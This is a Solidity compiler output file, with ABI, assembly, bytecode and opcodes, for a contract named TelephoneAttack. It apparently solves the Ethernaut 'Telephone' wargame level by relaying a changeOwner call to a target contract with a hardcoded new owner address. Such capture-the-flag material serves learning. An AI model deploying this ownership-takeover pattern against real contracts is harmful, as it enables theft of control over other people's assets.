{
	"contracts/Telephone.sol": {
		"TelephoneAttack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "telAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Telephone.sol\":104:358  contract TelephoneAttack {... */\n  mstore(0x40, 0xa0)\n    /* \"contracts/Telephone.sol\":173:249  constructor(address telAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Telephone.sol\":231:241  telAddress */\n  dup1\n    /* \"contracts/Telephone.sol\":215:242  tel = Telephone(telAddress) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x60\n  shl\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/Telephone.sol\":173:249  constructor(address telAddress) {... */\n  pop\n    /* \"contracts/Telephone.sol\":104:358  contract TelephoneAttack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:440   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:245   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":291:292   */\n  0x00\n    /* \"#utility.yul\":288:289   */\n  dup1\n    /* \"#utility.yul\":281:293   */\n  revert\n    /* \"#utility.yul\":243:245   */\ntag_13:\n    /* \"#utility.yul\":334:335   */\n  0x00\n    /* \"#utility.yul\":359:423   */\n  tag_14\n    /* \"#utility.yul\":415:422   */\n  dup5\n    /* \"#utility.yul\":406:412   */\n  dup3\n    /* \"#utility.yul\":395:404   */\n  dup6\n    /* \"#utility.yul\":391:413   */\n  add\n    /* \"#utility.yul\":359:423   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":349:423   */\n  swap2\n  pop\n    /* \"#utility.yul\":305:433   */\n  pop\n    /* \"#utility.yul\":233:440   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":446:542   */\ntag_15:\n  0x00\n    /* \"#utility.yul\":512:536   */\n  tag_17\n    /* \"#utility.yul\":530:535   */\n  dup3\n    /* \"#utility.yul\":512:536   */\n  tag_18\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":501:536   */\n  swap1\n  pop\n    /* \"#utility.yul\":491:542   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":548:674   */\ntag_18:\n  0x00\n    /* \"#utility.yul\":625:667   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":618:623   */\n  dup3\n    /* \"#utility.yul\":614:668   */\n  and\n    /* \"#utility.yul\":603:668   */\n  swap1\n  pop\n    /* \"#utility.yul\":593:674   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":680:802   */\ntag_11:\n    /* \"#utility.yul\":753:777   */\n  tag_21\n    /* \"#utility.yul\":771:776   */\n  dup2\n    /* \"#utility.yul\":753:777   */\n  tag_15\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":746:751   */\n  dup2\n    /* \"#utility.yul\":743:778   */\n  eq\n    /* \"#utility.yul\":733:735   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":792:793   */\n  0x00\n    /* \"#utility.yul\":789:790   */\n  dup1\n    /* \"#utility.yul\":782:794   */\n  revert\n    /* \"#utility.yul\":733:735   */\ntag_22:\n    /* \"#utility.yul\":723:802   */\n  pop\n  jump\t// out\n    /* \"contracts/Telephone.sol\":104:358  contract TelephoneAttack {... */\ntag_6:\n  shr(0x60, mload(0x80))\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"contracts/Telephone.sol\":104:358  contract TelephoneAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Telephone.sol\":255:356  function attack() public {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"contracts/Telephone.sol\":290:293  tel */\n      immutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n        /* \"contracts/Telephone.sol\":290:305  tel.changeOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa6f9dae1\n        /* \"contracts/Telephone.sol\":306:348  0x5816F13d2DD3327bc6d815b49bE6804cF0E3EAC1 */\n      0x5816f13d2dd3327bc6d815b49be6804cf0e3eac1\n        /* \"contracts/Telephone.sol\":290:349  tel.changeOwner(0x5816F13d2DD3327bc6d815b49bE6804cF0E3EAC1) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Telephone.sol\":255:356  function attack() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_13:\n        /* \"#utility.yul\":94:118   */\n      tag_15\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_16\n      jump\t// in\n    tag_15:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":72:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:353   */\n    tag_8:\n      0x00\n        /* \"#utility.yul\":262:264   */\n      0x20\n        /* \"#utility.yul\":251:260   */\n      dup3\n        /* \"#utility.yul\":247:265   */\n      add\n        /* \"#utility.yul\":239:265   */\n      swap1\n      pop\n        /* \"#utility.yul\":275:346   */\n      tag_18\n        /* \"#utility.yul\":343:344   */\n      0x00\n        /* \"#utility.yul\":332:341   */\n      dup4\n        /* \"#utility.yul\":328:345   */\n      add\n        /* \"#utility.yul\":319:325   */\n      dup5\n        /* \"#utility.yul\":275:346   */\n      tag_13\n      jump\t// in\n    tag_18:\n        /* \"#utility.yul\":229:353   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":359:455   */\n    tag_16:\n      0x00\n        /* \"#utility.yul\":425:449   */\n      tag_20\n        /* \"#utility.yul\":443:448   */\n      dup3\n        /* \"#utility.yul\":425:449   */\n      tag_21\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":414:449   */\n      swap1\n      pop\n        /* \"#utility.yul\":404:455   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":461:587   */\n    tag_21:\n      0x00\n        /* \"#utility.yul\":538:580   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":531:536   */\n      dup3\n        /* \"#utility.yul\":527:581   */\n      and\n        /* \"#utility.yul\":516:581   */\n      swap1\n      pop\n        /* \"#utility.yul\":506:587   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220e05d38cfa04a52278cb8aac21fa757f1a6298c9b40c5d7c02a2787410945b3db64736f6c63430008000033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a060405234801561001057600080fd5b5060405161028038038061028083398181016040528101906100329190610084565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b81525050506100f6565b60008151905061007e816100df565b92915050565b60006020828403121561009657600080fd5b60006100a48482850161006f565b91505092915050565b60006100b8826100bf565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100e8816100ad565b81146100f357600080fd5b50565b60805160601c61016d6101136000396000603c015261016d6000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80639e5faafc14610030575b600080fd5b61003861003a565b005b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1735816f13d2dd3327bc6d815b49be6804cf0e3eac16040518263ffffffff1660e01b81526004016100a791906100ea565b600060405180830381600087803b1580156100c157600080fd5b505af11580156100d5573d6000803e3d6000fd5b50505050565b6100e481610105565b82525050565b60006020820190506100ff60008301846100db565b92915050565b600061011082610117565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff8216905091905056fea2646970667358221220e05d38cfa04a52278cb8aac21fa757f1a6298c9b40c5d7c02a2787410945b3db64736f6c63430008000033",
					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x280 CODESIZE SUB DUP1 PUSH2 0x280 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x84 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE POP POP POP PUSH2 0xF6 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x7E DUP2 PUSH2 0xDF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x96 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xA4 DUP5 DUP3 DUP6 ADD PUSH2 0x6F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xB8 DUP3 PUSH2 0xBF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE8 DUP2 PUSH2 0xAD JUMP JUMPDEST DUP2 EQ PUSH2 0xF3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH1 0x60 SHR PUSH2 0x16D PUSH2 0x113 PUSH1 0x0 CODECOPY PUSH1 0x0 PUSH1 0x3C ADD MSTORE PUSH2 0x16D PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 PUSH20 0x5816F13D2DD3327BC6D815B49BE6804CF0E3EAC1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA7 SWAP2 SWAP1 PUSH2 0xEA JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xC1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xD5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0xE4 DUP2 PUSH2 0x105 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xFF PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xDB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x110 DUP3 PUSH2 0x117 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE0 0x5D CODESIZE 0xCF LOG0 0x4A MSTORE 0x27 DUP13 0xB8 0xAA 0xC2 0x1F 0xA7 JUMPI CALL 0xA6 0x29 DUP13 SWAP12 BLOCKHASH 0xC5 0xD7 0xC0 0x2A 0x27 DUP8 COINBASE MULMOD GASLIMIT 0xB3 0xDB PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "73000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}